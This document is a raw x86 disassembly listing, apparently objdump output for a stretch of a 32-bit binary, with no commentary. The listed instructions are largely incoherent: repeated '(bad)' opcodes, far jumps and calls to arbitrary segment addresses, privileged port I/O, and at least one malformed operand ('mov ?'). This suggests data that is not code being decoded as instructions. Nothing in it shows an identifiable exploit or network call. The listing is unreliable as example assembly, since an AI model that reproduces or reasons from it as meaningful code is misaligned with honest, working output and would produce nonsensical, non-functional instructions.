  4096b4:	mov    esp,0xd0588b36
  4096b9:	mov    bh,0xbb
  4096bb:	sub    al,0x8e
  4096bd:	xor    si,WORD PTR [ebp-0x55]
  4096c1:	jno    0x409660
  4096c3:	nop
  4096c4:	(bad)  
  4096c6:	pop    edi
  4096c7:	out    0xdd,eax
  4096c9:	dec    ebp
  4096ca:	stos   DWORD PTR es:[edi],eax
  4096cb:	and    ah,dl
  4096cd:	mov    ah,0x5c
  4096cf:	nop
  4096d0:	cld    
  4096d1:	jbe    0x409717
  4096d3:	xor    al,0xa9
  4096d5:	in     al,0x55
  4096d7:	dec    ecx
  4096d8:	dec    ecx
  4096d9:	jmp    0x8d5b1c15
  4096de:	cmp    eax,0xa8aaebb1
  4096e3:	imul   eax,DWORD PTR [ecx-0xcb52d45],0xffffffb9
  4096ea:	cmp    al,0x4e
  4096ec:	inc    edi
  4096ed:	add    eax,0xeb9d909e
  4096f2:	leave  
  4096f3:	adc    ah,BYTE PTR [ebp+0x25]
  4096f6:	mov    esi,DWORD PTR [esi+ebp*1]
  4096f9:	mov    ch,0x57
  4096fb:	das    
  4096fc:	aad    0xdb
  4096fe:	jb     0x4096d8
  409700:	js     0x4096bd
  409702:	pop    edi
  409703:	sbb    ebp,DWORD PTR [eax+0x7f7be05f]
  409709:	and    eax,0x1fe60289
  40970e:	ficom  DWORD PTR [ecx+0x2a]
  409711:	pop    ds
  409712:	mov    ebx,0x63905fa6
  409717:	imul   edx,DWORD PTR [esi],0xffffffa5
  40971a:	cdq    
  40971b:	push   es
  40971c:	pop    esi
  40971d:	dec    edx
  40971e:	mov    ecx,0x4e693e0a
  409723:	pop    ecx
  409724:	ror    DWORD PTR [ecx],1
  409726:	adc    ch,BYTE PTR [ebx+0x5fe285d5]
  40972c:	sbb    dl,BYTE PTR [ecx-0x70]
  40972f:	stc    
  409730:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409731:	jns    0x4096cc
  409733:	pop    ecx
  409734:	jo     0x409782
  409736:	mov    eax,0x8b07b0f5
  40973b:	cmovs  ebp,DWORD PTR [edx+0x1abd18e7]
  409742:	stos   BYTE PTR es:[edi],al
  409743:	fcomip st,st(4)
  409745:	jno    0x4096d4
  409747:	dec    edx
  409748:	cmp    al,0x47
  40974a:	xchg   ecx,eax
  40974b:	xor    eax,0xee752c4b
  409750:	imul   ebx,DWORD PTR [ebp-0x36],0x2fa23b01
  409757:	(bad)  
  409758:	stos   BYTE PTR es:[edi],al
  409759:	pop    ecx
  40975a:	lods   eax,DWORD PTR ds:[esi]
  40975b:	xchg   edi,eax
  40975c:	pop    ss
  40975d:	xchg   esi,eax
  40975e:	in     eax,0x3d
  409760:	push   eax
  409761:	frstor [edx+0x21]
  409764:	mov    bh,0x7e
  409766:	inc    ecx
  409767:	lahf   
  409768:	sbb    al,0x5d
  40976a:	cmp    BYTE PTR [edi-0x7a9f8c77],bl
  409770:	sub    eax,esp
  409772:	mov    eax,0x6d26fb12
  409777:	add    al,0x92
  409779:	push   ss
  40977a:	(bad)  
  40977c:	int    0x7c
  40977e:	imul   esp,DWORD PTR [eax-0x162e8654],0x76afe04d
  409788:	inc    ebp
  409789:	sub    dh,BYTE PTR [esi-0xd]
  40978c:	jmp    0xa262:0xc39c1ba2
  409793:	test   BYTE PTR [esi-0x11587ef0],bh
  409799:	outs   dx,BYTE PTR ds:[esi]
  40979a:	sbb    bl,BYTE PTR [eax]
  40979c:	stos   BYTE PTR es:[edi],al
  40979d:	jg     0x40979e
  40979f:	(bad)  
  4097a0:	out    0xcb,al
  4097a2:	stc    
  4097a3:	mov    esp,0x737168f0
  4097a8:	xor    ebp,DWORD PTR [edi+0x29]
  4097ab:	daa    
  4097ac:	pop    ss
  4097ad:	dec    edi
  4097ae:	mov    fs,ebx
  4097b0:	(bad)  
  4097b1:	loopne 0x40982c
  4097b3:	fs into 
  4097b5:	mov    ch,BYTE PTR [ecx+0x54fcc2fb]
  4097bb:	pop    edx
  4097bc:	push   ecx
  4097bd:	pop    ss
  4097be:	add    al,0x12
  4097c0:	in     al,dx
  4097c1:	inc    ebp
  4097c2:	mov    al,0xa6
  4097c4:	les    esi,FWORD PTR [ebx+0x633fdb4a]
  4097ca:	test   DWORD PTR [ebx+0x51b118b2],ecx
  4097d0:	cmp    esp,ecx
  4097d2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4097d3:	inc    eax
  4097d4:	mov    ebp,0xb13116cb
  4097d9:	push   0xffffff84
  4097db:	popa   
  4097dc:	jg     0x409789
  4097de:	imul   bh
  4097e0:	retf   
  4097e1:	mov    ecx,0x4f38d6fe
  4097e6:	sar    edi,0x2e
  4097e9:	or     DWORD PTR [ebx],0x74275740
  4097ef:	dec    ebp
  4097f0:	sub    DWORD PTR [edi],esp
  4097f2:	mov    ah,0xbc
  4097f4:	mov    ch,0xec
  4097f6:	int3   
  4097f7:	and    al,0x73
  4097f9:	lea    ebp,[edx]
  4097fb:	mov    al,ds:0x265f9a2f
  409800:	ins    BYTE PTR es:[edi],dx
  409801:	arpl   WORD PTR [esi-0x3d],sp
  409804:	inc    esp
  409805:	jg     0x409828
  409807:	stos   BYTE PTR es:[edi],al
  409808:	fwait
  409809:	push   eax
  40980a:	popa   
  40980b:	ins    DWORD PTR es:[edi],dx
  40980c:	jae    0x40985b
  40980e:	xor    eax,DWORD PTR [ebx-0x69391066]
  409814:	out    dx,eax
  409815:	xor    eax,0x8684ab8c
  40981a:	mov    cl,bl
  40981c:	loopne 0x409856
  40981e:	dec    esi
  40981f:	push   es
  409820:	scas   eax,DWORD PTR es:[edi]
  409821:	out    0xa5,al
  409823:	hlt    
  409824:	mov    esi,0xfa7fec22
  409829:	jae    0x409896
  40982b:	dec    esi
  40982c:	pop    esi
  40982d:	push   es
  40982e:	pop    eax
  40982f:	inc    esi
  409831:	test   eax,0xb4117791
  409836:	pop    ecx
  409837:	leave  
  409838:	mov    dh,BYTE PTR fs:[edx-0x2a]
  40983c:	jmp    FWORD PTR [edx]
  40983e:	ret    
  40983f:	repnz and eax,0x7466fcf9
  409845:	push   cs
  409846:	leave  
  409847:	push   ebx
  409848:	push   ecx
  409849:	shl    BYTE PTR [edx],cl
  40984b:	adc    edx,0x22070c93
  409851:	xlat   BYTE PTR ds:[ebx]
  409852:	clc    
  409853:	cmp    cl,BYTE PTR [eax+0x672d8a76]
  409859:	enter  0x7fd1,0x51
  40985d:	mov    edx,0x1af98276
  409862:	outs   dx,DWORD PTR ds:[esi]
  409863:	cmp    al,0x42
  409865:	fdivp  st(0),st
  409867:	gs add ah,bh
  40986a:	ja     0x409885
  40986c:	push   ebp
  40986d:	dec    eax
  40986e:	mov    esi,0x3ddade5b
  409873:	ret    
  409874:	pop    es
  409875:	adc    BYTE PTR [ebx-0x3edd27f3],bl
  40987b:	push   ds
  40987c:	and    DWORD PTR [esi-0x14],edi
  40987f:	inc    edx
  409880:	out    dx,eax
  409881:	lahf   
  409882:	sbb    BYTE PTR [eax+0x70cc6d12],cl
  409888:	mov    ch,0xc0
  40988a:	pushf  
  40988b:	movmskps ebp,xmm4
  40988e:	fs jne 0x4098c2
  409891:	mov    ebp,0x6cc3dd1d
  409896:	push   0x84cf0a2c
  40989b:	or     BYTE PTR [edi-0x368d8043],dh
  4098a1:	push   edx
  4098a2:	stos   DWORD PTR es:[edi],eax
  4098a3:	cmp    ecx,DWORD PTR [ecx+0xcb2819d]
  4098a9:	sbb    DWORD PTR [eax],eax
  4098ab:	mov    bh,0x48
  4098ad:	mov    DWORD PTR gs:[edx],ebp
  4098b0:	(bad)  
  4098b1:	add    BYTE PTR [eax-0x3551ac46],ah
  4098b7:	sub    dl,BYTE PTR [ebp-0x722edbff]
  4098bd:	addr16 out 0x6e,eax
  4098c0:	dec    esp
  4098c1:	loopne 0x409844
  4098c3:	xchg   BYTE PTR [ecx-0x74c38493],cl
  4098c9:	(bad)  
  4098ca:	outs   dx,BYTE PTR ds:[esi]
  4098cb:	fsubr  DWORD PTR [edi]
  4098cd:	jge    0x40988c
  4098cf:	xchg   ebp,eax
  4098d0:	call   0x38a8:0xd92941dd
  4098d7:	push   ebx
  4098d8:	jecxz  0x4098fa
  4098da:	or     BYTE PTR [edx],ah
  4098dc:	iret   
  4098dd:	xchg   edi,eax
  4098de:	mov    al,ds:0x8ed46923
  4098e3:	adc    al,0x9f
  4098e5:	xchg   BYTE PTR [ebp+0x58e2cb6d],ch
  4098eb:	lea    ebp,[ebx-0x54]
  4098ee:	pop    edi
  4098ef:	test   ebp,edx
  4098f1:	push   ebx
  4098f2:	loope  0x409889
  4098f4:	mov    cl,0xb0
  4098f6:	or     eax,0x2dfa6bdc
  4098fb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4098fc:	adc    BYTE PTR [esi+0x5d],0x6b
  409900:	repz jmp 0x808d424e
  409906:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409907:	xchg   esi,eax
  409908:	xor    al,0x16
  40990a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40990b:	xchg   edi,eax
  40990c:	ret    0x89a4
  40990f:	mov    bl,0xae
  409911:	mov    ebx,ss
  409913:	and    ecx,DWORD PTR ds:0x6760622a
  409919:	mov    fs,WORD PTR [ebx]
  40991b:	sub    edx,esp
  40991d:	pop    ss
  40991e:	cmp    eax,0x21624ce1
  409923:	sbb    ch,BYTE PTR ds:0xf8ba5f08
  409929:	pop    ebp
  40992a:	sti    
  40992b:	nop
  40992c:	cdq    
  40992d:	sub    al,0x6b
  40992f:	outs   dx,DWORD PTR ds:[esi]
  409930:	mov    ebp,0x2e9913ff
  409935:	cdq    
  409936:	xchg   ebp,eax
  409937:	jne    0x40994d
  409939:	mov    ch,0x7b
  40993b:	fnstsw ax
  40993d:	push   edx
  40993e:	or     DWORD PTR [esi-0x1acd2557],edi
  409944:	push   edx
  409945:	and    esp,DWORD PTR [ecx+eax*8-0x34a9c507]
  40994c:	sahf   
  40994d:	push   eax
  40994e:	xchg   edx,eax
  40994f:	cli    
  409950:	jns    0x4098f7
  409952:	punpcklbw mm1,mm3
  409955:	mov    BYTE PTR [eax+0x8f9ab5],bl
  40995b:	mov    ebp,0xc00cd297
  409960:	rcr    ah,0x26
  409963:	mov    ds:0xcb9f9984,eax
  409968:	mov    ebx,0x6066a46f
  40996d:	les    edi,FWORD PTR [edx]
  40996f:	pop    esi
  409970:	cmp    al,0x7
  409972:	scas   eax,DWORD PTR es:[edi]
  409973:	push   es
  409974:	adc    DWORD PTR [eax],ecx
  409976:	shl    ch,0xb3
  409979:	test   ebx,eax
  40997b:	pop    edx
  40997c:	add    al,BYTE PTR [edx]
  40997e:	dec    edx
  40997f:	mov    eax,0x78207000
  409984:	sbb    dl,dh
  409986:	in     al,dx
  409987:	jg     0x409971
  409989:	lahf   
  40998a:	daa    
  40998b:	and    DWORD PTR [ebx+0x2e3ad82d],edi
  409991:	jbe    0x4099ea
  409993:	aad    0x4f
  409995:	or     al,0x4a
  409997:	into   
  409998:	push   eax
  409999:	lahf   
  40999a:	clc    
  40999b:	sbb    DWORD PTR [eax],0xffffffa6
  40999e:	mov    cl,0x5c
  4099a0:	out    dx,eax
  4099a1:	call   0x5104d39a
  4099a6:	fld    DWORD PTR [edi-0x79c5014e]
  4099ac:	dec    ebp
  4099ad:	mov    ch,0x72
  4099af:	or     eax,0x16f4b277
  4099b4:	xor    al,0x5c
  4099b6:	jnp    0x4099a1
  4099b8:	xchg   dh,bl
  4099ba:	sub    bh,BYTE PTR ds:0xe35daa13
  4099c0:	aaa    
  4099c1:	sub    eax,0x6880a30
  4099c6:	out    dx,al
  4099c7:	inc    edx
  4099c8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4099c9:	adc    al,0x30
  4099cb:	pop    esp
  4099cc:	xor    esi,esp
  4099ce:	leave  
  4099cf:	shl    edi,cl
  4099d1:	jl     0x4099b7
  4099d3:	cmp    al,0xdd
  4099d5:	adc    BYTE PTR [ebp-0x2b],dl
  4099d8:	cmp    dl,BYTE PTR [ebx]
  4099da:	jmp    0xe9a8553d
  4099df:	jmp    0x409998
  4099e1:	push   cs
  4099e2:	xchg   ebp,eax
  4099e3:	and    esp,DWORD PTR ds:0x83a30405
  4099e9:	ss lahf 
  4099eb:	std    
  4099ec:	les    edx,FWORD PTR [ecx+ecx*2+0x27a0a1b5]
  4099f3:	and    BYTE PTR [ecx],al
  4099f5:	inc    ebp
  4099f6:	aaa    
  4099f7:	jo     0x409a34
  4099f9:	or     cl,BYTE PTR [ebx+0x15e92a8b]
  4099ff:	and    DWORD PTR [esi+0x6e],esi
  409a02:	mov    ds:0x6f0a98c3,al
  409a07:	push   ds
  409a08:	cwde   
  409a09:	mov    bh,BYTE PTR [eax-0x7e1a431e]
  409a0f:	adc    eax,0xaf42a514
  409a14:	pop    esp
  409a15:	or     al,0xe0
  409a17:	mov    cr6,esi
  409a1a:	push   esp
  409a1b:	jmp    0xec7b2adf
  409a20:	out    0x3e,al
  409a22:	or     esp,edx
  409a24:	aad    0xc1
  409a26:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409a27:	in     eax,dx
  409a28:	stos   BYTE PTR es:[edi],al
  409a29:	inc    ecx
  409a2a:	and    DWORD PTR [esi+edi*1+0x2759b636],ecx
  409a31:	mov    ebx,0x28f50f6c
  409a36:	pop    edi
  409a37:	daa    
  409a38:	out    0x53,eax
  409a3a:	iret   
  409a3b:	mov    ebx,0x522b3b03
  409a40:	sub    eax,0xef8407c2
  409a45:	xchg   esp,eax
  409a46:	repnz jmp 0xa6d6:0xd63e39d7
  409a4e:	jb     0x409a85
  409a50:	and    DWORD PTR [eax-0x13a5c2af],0xffffffd8
  409a57:	rcl    BYTE PTR [edi],1
  409a59:	je     0x4099df
  409a5b:	mov    bh,0x94
  409a5d:	mov    esi,0xfb30631f
  409a62:	dec    ecx
  409a63:	xchg   esp,eax
  409a64:	mov    cl,0xa4
  409a66:	out    0x52,eax
  409a68:	xchg   ebx,eax
  409a69:	push   cs
  409a6a:	or     BYTE PTR [ebp-0x1],bl
  409a6d:	out    0xf2,al
  409a6f:	lods   eax,DWORD PTR ds:[esi]
  409a70:	arpl   bx,cx
  409a72:	mov    ah,0x38
  409a74:	ins    DWORD PTR es:[edi],dx
  409a75:	loope  0x409aa2
  409a77:	fistp  DWORD PTR [ebx+0x57]
  409a7a:	mov    eax,0x86f2b4a1
  409a7f:	mov    edi,0xa5131196
  409a84:	pop    esi
  409a85:	mov    bh,0xe
  409a87:	xchg   esi,edi
  409a89:	mov    cl,0x2c
  409a8b:	test   eax,0x68242c22
  409a90:	sub    eax,0x40d7e88e
  409a95:	or     dl,BYTE PTR [esi+0x1b]
  409a98:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409a99:	xchg   edi,eax
  409a9a:	mov    al,0x11
  409a9c:	pop    edi
  409a9d:	push   ebx
  409a9e:	jne    0x409a5a
  409aa0:	(bad)  
  409aa1:	jmp    DWORD PTR [ebx-0xdc9f827]
  409aa7:	in     al,dx
  409aa8:	cli    
  409aa9:	js     0x409b0c
  409aab:	pop    edx
  409aac:	add    eax,0x88c86602
  409ab1:	mov    al,BYTE PTR [edi+edx*8-0x19fe418a]
  409ab8:	aam    0xbc
  409aba:	xchg   edx,eax
  409abb:	dec    ebp
  409abc:	dec    edi
  409abd:	mov    dh,0xf
  409abf:	xchg   edx,esp
  409ac1:	or     ecx,DWORD PTR [edi-0x25]
  409ac4:	pop    edi
  409ac5:	push   ecx
  409ac6:	push   ebp
  409ac7:	push   es
  409ac8:	adc    al,0x1d
  409aca:	cmc    
  409acb:	(bad)  
  409acc:	jmp    0xb071:0xf6134ca4
  409ad3:	mov    cl,0xbd
  409ad5:	loope  0x409a5b
  409ad7:	fbld   TBYTE PTR [esi]
  409ad9:	xchg   esp,eax
  409ada:	icebp  
  409adb:	xor    eax,0x889221ea
  409ae0:	pop    esp
  409ae1:	test   BYTE PTR [ebx+ebx*1+0x39],bl
  409ae5:	xchg   edi,edi
  409ae7:	sub    DWORD PTR [edx-0x79a470ac],edi
  409aed:	mov    al,ds:0xe7c2bd7e
  409af2:	push   ax
  409af4:	and    DWORD PTR [esi],eax
  409af6:	push   0xffffffd0
  409af8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409af9:	and    cl,0x50
  409afc:	mov    al,0x45
  409afe:	(bad)  
  409aff:	and    eax,0x2015c089
  409b04:	add    al,0xff
  409b06:	or     ecx,DWORD PTR ds:0xb44e3329
  409b0c:	ret    0xc961
  409b0f:	outs   dx,BYTE PTR ds:[esi]
  409b10:	std    
  409b11:	ret    0x3e29
  409b14:	sahf   
  409b15:	xchg   esi,eax
  409b16:	pop    ss
  409b17:	pop    ecx
  409b18:	adc    cl,BYTE PTR [esi-0xc]
  409b1b:	or     ebp,DWORD PTR [edx+0x2427ef1b]
  409b21:	fadd   st,st(7)
  409b23:	inc    ecx
  409b24:	cmp    BYTE PTR [ebp+0x70e3d43c],bh
  409b2a:	lods   al,BYTE PTR ds:[esi]
  409b2b:	dec    ecx
  409b2c:	cwde   
  409b2d:	mov    esp,0x65531780
  409b32:	adc    edx,0x21
  409b35:	stc    
  409b36:	into   
  409b37:	xchg   esi,eax
  409b38:	push   es
  409b39:	rol    ecx,0xf
  409b3c:	ficomp DWORD PTR [esp+esi*8]
  409b3f:	mov    WORD PTR [edi],ds
  409b41:	sub    cl,dh
  409b43:	add    ebx,DWORD PTR [edx+0x13]
  409b46:	aad    0x95
  409b48:	cwde   
  409b49:	add    dl,BYTE PTR ds:0x733dca80
  409b4f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409b50:	mov    ss,ecx
  409b52:	js     0x409ae3
  409b54:	inc    ecx
  409b55:	cld    
  409b56:	test   al,0xdc
  409b58:	cli    
  409b59:	jmp    0x409b56
  409b5b:	(bad)  
  409b5c:	mov    BYTE PTR ds:0xe759b74b,dh
  409b62:	inc    ecx
  409b63:	push   0x2a67015c
  409b68:	mov    al,ds:0x79ca0a8f
  409b6d:	mov    gs,WORD PTR [edi+0x55]
  409b70:	cmp    al,0x5b
  409b72:	dec    esi
  409b73:	push   0xffffffa9
  409b75:	inc    edx
  409b76:	dec    eax
  409b77:	add    BYTE PTR [eax+ebx*2-0x21],ah
  409b7b:	mov    dh,0x29
  409b7d:	test   al,0x6
  409b7f:	in     eax,0x6a
  409b81:	in     eax,dx
  409b82:	sub    BYTE PTR [edx],dh
  409b84:	dec    ebx
  409b85:	ds pop ecx
  409b87:	shl    DWORD PTR ds:[edx],cl
  409b8a:	mov    ds:0xed56545d,eax
  409b8f:	sbb    eax,0xb1296be6
  409b94:	mov    edi,0x337630f9
  409b99:	dec    esi
  409b9a:	dec    esi
  409b9b:	sub    eax,0x76357437
  409ba0:	sti    
  409ba1:	xchg   esp,eax
  409ba2:	push   eax
  409ba3:	mov    al,ds:0xff5678e9
  409ba8:	or     DWORD PTR ds:0x515e25dd,0xffffffd9
  409baf:	mov    ebp,DWORD PTR [edx]
  409bb1:	or     al,0xf5
  409bb3:	daa    
  409bb4:	sbb    ebp,edi
  409bb6:	ins    BYTE PTR es:[edi],dx
  409bb7:	or     ebp,DWORD PTR [eax]
  409bb9:	sub    al,0x4d
  409bbb:	lock out 0xc5,al
  409bbe:	gs dec ebp
  409bc0:	xchg   BYTE PTR [ebx+0x32],bh
  409bc3:	push   cs
  409bc4:	jnp    0x409bff
  409bc6:	lods   al,BYTE PTR ds:[esi]
  409bc7:	inc    BYTE PTR [ecx]
  409bc9:	test   eax,0x851e29d4
  409bce:	(bad)  
  409bcf:	ss jmp 0x3ff8:0x7eb1ad3f
  409bd7:	cs pop ebx
  409bd9:	loope  0x409b5e
  409bdb:	hlt    
  409bdc:	loopne 0x409bfc
  409bde:	std    
  409bdf:	add    eax,0x863c4c08
  409be4:	adc    al,0xd7
  409be6:	adc    DWORD PTR [edx+0xa351edd],esp
  409bec:	mov    DWORD PTR [esi],edx
  409bee:	mov    WORD PTR [ebp+0x1df6a50b],fs
  409bf4:	mov    BYTE PTR [ebx+0x5c],bh
  409bf7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409bf8:	and    bl,BYTE PTR [ecx-0x16]
  409bfb:	(bad)  
  409bfc:	sub    ch,BYTE PTR [edx+ebp*1-0x6ccf1b4]
  409c03:	dec    ebp
  409c04:	icebp  
  409c05:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409c06:	push   esi
  409c07:	ss hlt 
  409c09:	cmp    edx,DWORD PTR [eax+ebx*8-0x588e7e4f]
  409c10:	jne    0x409be7
  409c12:	mov    ds:0x659bcd72,al
  409c17:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409c18:	mov    ?,WORD PTR [edi+ebx*8-0x3e60d9d7]
  409c1f:	push   ecx
  409c20:	lods   eax,DWORD PTR ds:[esi]
  409c21:	mov    BYTE PTR ss:[ebx-0x71d33f48],dh
  409c28:	push   edx
  409c29:	repnz cmc 
  409c2b:	dec    ebx
  409c2c:	fmul   DWORD PTR [ebx]
  409c2e:	(bad)  
  409c2f:	xor    eax,0xffd20e7
  409c34:	mov    al,BYTE PTR [ebp-0x7c]
  409c37:	das    
  409c38:	push   ss
  409c39:	pop    es
  409c3a:	scas   eax,DWORD PTR es:[edi]
  409c3b:	dec    esp
  409c3c:	mov    ch,0x11
  409c3e:	in     al,0xa2
  409c40:	cli    
  409c41:	or     BYTE PTR [ebp+0x7c],ch
  409c44:	jecxz  0x409c74
  409c46:	xor    al,0x49
  409c48:	sahf   
  409c49:	(bad)  
  409c4a:	mov    eax,ds:0x72233890
  409c4f:	jae    0x409be8
  409c51:	aaa    
  409c52:	or     DWORD PTR [edx+0x6ad514b4],0x42a91960
  409c5c:	int3   
  409c5d:	sahf   
  409c5e:	popf   
  409c5f:	test   BYTE PTR [esi],0x51
  409c62:	push   ecx
  409c63:	xchg   esi,eax
  409c64:	lods   al,BYTE PTR ds:[esi]
  409c65:	inc    edx
  409c66:	arpl   ax,bx
  409c68:	lea    edi,[ecx+0x65a42e27]
  409c6e:	jnp    0x409c18
  409c70:	clc    
  409c71:	mov    esi,0xb0ec21a2
  409c76:	mov    ch,0x4f
  409c78:	das    
  409c79:	sbb    eax,DWORD PTR [edx]
  409c7b:	sar    DWORD PTR [ebp-0x1dab5017],1
  409c81:	mov    ebp,0x4fb093cd
  409c86:	dec    ebx
  409c87:	aas    
  409c88:	bound  edi,QWORD PTR [ebp+0x25]
  409c8b:	jae    0x409cbf
  409c8d:	or     BYTE PTR [ebx+edx*4],ah
  409c90:	jmp    0x68798c30
  409c95:	jmp    0x409c5b
  409c97:	add    edx,DWORD PTR ds:0xb9
	...
  409d11:	add    BYTE PTR [eax],al
  409d13:	add    BYTE PTR [ebx],dl
  409d15:	or     eax,0xf7be76a8
  409d1a:	fild   QWORD PTR [ebp-0x8]
  409d1d:	out    0xa8,al
  409d1f:	rep lods eax,DWORD PTR ds:[esi]
  409d21:	jmp    0x502c910c
  409d26:	add    BYTE PTR [eax],al
  409d28:	outs   dx,BYTE PTR ds:[esi]
  409d29:	pop    es
  409d2a:	add    BYTE PTR [eax],al
  409d2c:	xlat   BYTE PTR ds:[ebx]
  409d2d:	fsub   DWORD PTR [ebx+0x630be64a]
  409d33:	or     al,ah
  409d35:	pop    edx
  409d36:	and    eax,0xcb8dfdc
  409d3b:	jl     0x409d20
  409d3d:	jb     0x409cd9
  409d3f:	call   0x913d:0x9cb4f5de
  409d46:	outs   dx,DWORD PTR ds:[esi]
  409d47:	movs   BYTE PTR es:[edi],BYTE PTR fs:[esi]
  409d49:	add    eax,0xcc20f83f
  409d4e:	or     DWORD PTR [edi+ebx*4-0x426fd786],edx
  409d55:	in     eax,dx
  409d56:	out    0xad,al
  409d58:	in     eax,dx
  409d59:	bound  esi,QWORD PTR [edx]
  409d5b:	iret   
  409d5c:	pop    ss
  409d5d:	mov    bh,0x4e
  409d5f:	add    edx,ecx
  409d61:	scas   eax,DWORD PTR es:[edi]
  409d62:	ins    BYTE PTR es:[edi],dx
  409d63:	mov    al,0x2f
  409d65:	sbb    DWORD PTR [esi*1+0x3d091aa3],ebp
  409d6c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409d6d:	adc    BYTE PTR [eax-0x5a],al
  409d70:	adc    dl,dl
  409d72:	icebp  
  409d73:	cmp    DWORD PTR [esi],eax
  409d75:	and    al,0xbb
  409d77:	(bad)  
  409d78:	jnp    0x409d28
  409d7a:	inc    eax
  409d7b:	int    0x28
  409d7d:	fsubr  st,st(5)
  409d7f:	add    DWORD PTR [ebp+0x38475d14],esp
  409d85:	jmp    DWORD PTR [ebx-0x112c80c6]
  409d8b:	call   0x8ba9a45a
  409d90:	or     ah,cl
  409d92:	retf   
  409d93:	sub    ebp,DWORD PTR ds:0x5de4be44
  409d99:	je     0x409dcc
  409d9b:	jmp    0xbfb:0x54f56136
  409da2:	daa    
  409da3:	inc    edx
  409da4:	xchg   esp,eax
  409da5:	inc    eax
  409da6:	sbb    al,BYTE PTR [ecx+0x48f2fdfb]
  409dac:	(bad)  
  409dad:	jmp    0x409d47
  409daf:	cwde   
  409db0:	out    dx,al
  409db1:	push   edi
  409db2:	mov    ch,0xad
  409db4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409db5:	loop   0x409e0a
  409db7:	fcomip st,st(4)
  409db9:	sbb    BYTE PTR [edi-0x47da15b3],0xd
  409dc0:	je     0x409d93
  409dc2:	les    ecx,FWORD PTR ds:[eax-0x25107b2a]
  409dc9:	repz and DWORD PTR [eax-0x68b726de],ecx
  409dd0:	rcr    BYTE PTR ds:0x22d73a15,0xdf
  409dd7:	mov    ebp,0xae954bb1
  409ddc:	and    edx,DWORD PTR [ebx]
  409dde:	repnz dec ecx
  409de0:	(bad)  
  409de1:	and    BYTE PTR [ebp-0x1bf8947f],bl
  409de7:	mov    al,cl
  409de9:	jmp    0x2f19:0x9265550e
  409df0:	outs   dx,DWORD PTR ds:[esi]
  409df1:	push   edx
  409df2:	jmp    0x3de1d4e9
  409df7:	mov    ah,0x65
  409df9:	dec    ecx
  409dfa:	pop    eax
  409dfb:	sub    BYTE PTR [ecx],ah
  409dfd:	lock movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409dff:	inc    ebp
  409e00:	ja     0x409e30
  409e02:	je     0x409dc5
  409e04:	xor    ch,BYTE PTR [esi+0x5f]
  409e07:	sar    BYTE PTR ds:0xcfd84eae,0x5c
  409e0e:	je     0x409e81
  409e10:	jg     0x409dcc
  409e12:	jge    0x409e09
  409e14:	aad    0xf8
  409e16:	shl    DWORD PTR [esi+0x3b],0xee
  409e1a:	cmp    eax,0x51bfdd3
  409e1f:	cld    
  409e20:	aad    0xe2
  409e22:	outs   dx,BYTE PTR ds:[esi]
  409e23:	sub    ebx,edi
  409e25:	mov    ecx,0x9fb0464a
  409e2a:	cwde   
  409e2b:	stos   DWORD PTR es:[edi],eax
  409e2c:	(bad)  
  409e2e:	aam    0x1
  409e30:	xor    cl,BYTE PTR [esp+eiz*8]
  409e33:	arpl   WORD PTR [ecx+eax*2],bp
  409e36:	int3   
  409e37:	jnp    0x409de7
  409e39:	imul   edi,DWORD PTR ds:0x55b9fadc,0xffffffe5
  409e40:	call   0xd324dfc0
  409e45:	test   BYTE PTR [eax],bl
  409e47:	lods   al,BYTE PTR ds:[esi]
  409e48:	sub    DWORD PTR [edi-0x62f37073],ecx
  409e4e:	loop   0x409e3c
  409e50:	popa   
  409e51:	push   cs
  409e52:	inc    eax
  409e53:	hlt    
  409e54:	loopne 0x409def
  409e56:	lock aaa 
  409e58:	pop    ebp
  409e59:	int3   
  409e5a:	in     al,0xdf
  409e5c:	idiv   DWORD PTR [ebp+0x3674a1c7]
  409e62:	xlat   BYTE PTR ds:[ebx]
  409e63:	add    DWORD PTR [ebx-0x18],edx
  409e66:	stc    
  409e67:	push   edi
  409e68:	mov    al,ds:0xb09dde3a
  409e6d:	idiv   BYTE PTR [esi-0x6988da4a]
  409e73:	rcr    BYTE PTR [ebx],0x4e
  409e76:	pushf  
  409e77:	fldenv [edx-0x33915970]
  409e7d:	aaa    
  409e7e:	xchg   ebx,eax
  409e7f:	and    ah,dl
  409e81:	std    
  409e82:	jecxz  0x409e64
  409e84:	loope  0x409e54
  409e86:	enter  0x414e,0xcf
  409e8a:	push   es
  409e8b:	frstor [ecx+0x12]
  409e8e:	inc    esi
  409e8f:	(bad)  
  409e90:	fstp   DWORD PTR [esi+0x43a18f39]
  409e96:	inc    ebx
  409e97:	in     eax,dx
  409e98:	mov    esi,0x3c228f72
  409e9d:	jmp    0x409f00
  409e9f:	mov    ebp,0xbfba4b62
  409ea4:	mov    ebp,0x36fb229b
  409ea9:	adc    ecx,DWORD PTR [ebx+eax*2+0x7be00792]
  409eb0:	icebp  
  409eb1:	shl    BYTE PTR [eax+edi*1-0x41],1
  409eb5:	add    eax,0xbc476177
  409eba:	mov    eax,DWORD PTR [esi+0x7051a36]
  409ec0:	sbb    al,0xcb
  409ec2:	cmp    bl,BYTE PTR [edi+ebp*1]
  409ec5:	add    eax,DWORD PTR [ebx+0x5f]
  409ec8:	inc    esi
  409ec9:	out    dx,eax
  409eca:	pop    ss
  409ecb:	mov    dh,0x6b
  409ecd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409ece:	fisubr WORD PTR [esi]
  409ed0:	ror    dl,cl
  409ed2:	stos   BYTE PTR es:[edi],al
  409ed3:	call   0x3497:0xc5b0f699
  409eda:	and    BYTE PTR [ebx],ch
  409edc:	call   0x1216:0x3c416c1c
  409ee3:	dec    esi
